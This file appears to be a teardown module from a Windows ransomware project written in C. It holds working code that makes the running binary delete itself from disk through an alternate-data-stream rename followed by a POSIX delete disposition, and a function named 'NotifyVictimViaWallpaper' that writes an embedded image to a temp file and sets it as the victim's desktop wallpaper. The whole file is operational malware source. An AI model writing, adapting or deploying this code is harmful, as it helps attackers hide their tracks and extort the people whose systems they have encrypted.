// Teardown.c
#include <windows.h>
#include <winternl.h>
#include "Common.h"
#include "Debug.h"
#include "Resource.h"
#include "Teardown.h"

#define FILE_DISPOSITION_DELETE 0x00000001
#define FILE_DISPOSITION_POSIX_SEMANTICS 0x00000002

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL DeleteBinaryFromDisk(void)
{
    HANDLE hFile = INVALID_HANDLE_VALUE;
    WCHAR  Path[MAX_PATH * 2] = { 0x00 };
    WCHAR  AltDataStream[MAX_PATH] = { 0x00 };
    SIZE_T cbAltDataStreamSize = 0;
    PFILE_RENAME_INFO pRenameInfo = NULL;
    SIZE_T cbRenameInfoSize = 0;
    BOOL   bSuccess = FALSE;


    lstrcpyW(AltDataStream, L":to_be_deleted");

    if (!GetModuleFileNameW(NULL, Path, MAX_PATH))
        return FALSE;

    if ((hFile = CreateFileW(Path, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL)) == INVALID_HANDLE_VALUE)
        return FALSE;

    cbAltDataStreamSize = lstrlenW(AltDataStream) * sizeof(WCHAR);
    cbRenameInfoSize = sizeof(FILE_RENAME_INFO) + cbAltDataStreamSize;

    if (!(pRenameInfo = (PFILE_RENAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbRenameInfoSize)))
        goto CLEANUP;

    pRenameInfo->FileNameLength = (DWORD)cbAltDataStreamSize;
    pRenameInfo->ReplaceIfExists = FALSE;
    pRenameInfo->RootDirectory = NULL;

    RtlCopyMemory(pRenameInfo->FileName, AltDataStream, cbAltDataStreamSize);

    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRenameInfo, (DWORD)cbRenameInfoSize))
        goto CLEANUP;

    CloseHandle(hFile);

    if ((hFile = CreateFileW(Path, DELETE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL)) == INVALID_HANDLE_VALUE)
        goto CLEANUP;

    FILE_DISPOSITION_INFO_EX DispositionInfo = { FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS };

    if (!SetFileInformationByHandle(hFile, FileDispositionInfoEx, &DispositionInfo, sizeof(DispositionInfo)))
        goto CLEANUP;

    bSuccess = TRUE;

CLEANUP:
    DELETE_HANDLE(hFile);
    FREE_HEAP(GetProcessHeap(), pRenameInfo);
    return bSuccess;
}



static BOOL FetchResource(IN LPCWSTR lpType, IN CONST DWORD dwResourceId, OUT PVOID* ppAddress, OUT PDWORD pdwLength)
{
    HRSRC   hRsrc = NULL;
    HGLOBAL hGlobal = NULL;
    HMODULE hModule = GetModuleHandleW(NULL);

    // lpType must match the folder name in Resource View (e.g., L"PNG")
    if (!(hRsrc = FindResourceW(hModule, MAKEINTRESOURCEW(dwResourceId), lpType)))
    {
        PRNT_WIN_ERR(FindResourceW);
        return FALSE;
    }

    if (!(hGlobal = LoadResource(hModule, hRsrc)))
    {
        PRNT_WIN_ERR(LoadResource);
        return FALSE;
    }

    // LockResource returns a pointer to the data already in the process memory space
    *ppAddress = LockResource(hGlobal);
    *pdwLength = SizeofResource(hModule, hRsrc);

    return (*ppAddress && *pdwLength > 0);
}


static BOOL WriteTempFile(IN LPCVOID pBuffer, IN DWORD dwLength, OUT LPWSTR wOutPath)
{
    WCHAR  wTempPath[MAX_PATH];
    HANDLE hTempFile = INVALID_HANDLE_VALUE;
    DWORD  dwRet = 0;
    DWORD  dwWritten = 0;

    RtlZeroMemory(wTempPath, sizeof(wTempPath));

    if ((dwRet = GetTempPathW(MAX_PATH, wTempPath)) == 0 ||
        dwRet > MAX_PATH)
    {
        PRNT_WIN_ERR(GetTempPathW);
        return FALSE;
    }

    // Creates a 0-byte file and gives us the name
    if (!GetTempFileNameW(wTempPath, L"WPC", 0, wOutPath))
    {
        PRNT_WIN_ERR(GetTempFileNameW);
        return FALSE;
    }

    // Write the actual resource data to that file
    if ((hTempFile = CreateFileW(wOutPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        PRNT_WIN_ERR(CreateFileW);
        DeleteFileW(wOutPath);
        return FALSE;
    }

    WriteFile(hTempFile, pBuffer, dwLength, &dwWritten, NULL);
    CloseHandle(hTempFile);

    if (dwWritten != dwLength)
    {
        PRNT_WIN_ERR(WriteFile);
        DeleteFileW(wOutPath);
        return FALSE;
    }

    return TRUE;
}

BOOL NotifyVictimViaWallpaper(void)
{
    PVOID pResourceData = NULL;
    DWORD dwResourceSize = 0;
    WCHAR wTempFileName[MAX_PATH] = { 0x00 };

    // Get PNG from resources
    if (!FetchResource(RES_TYPE_PNG, IDB_PNG1, &pResourceData, &dwResourceSize))
        return FALSE;
 
    //Dump to a temporary file
    if (!WriteTempFile(pResourceData, dwResourceSize, wTempFileName))
        return FALSE;

    // Update System Wallpaper
    if (!SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wTempFileName, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE))
        return FALSE;

    return TRUE;
}

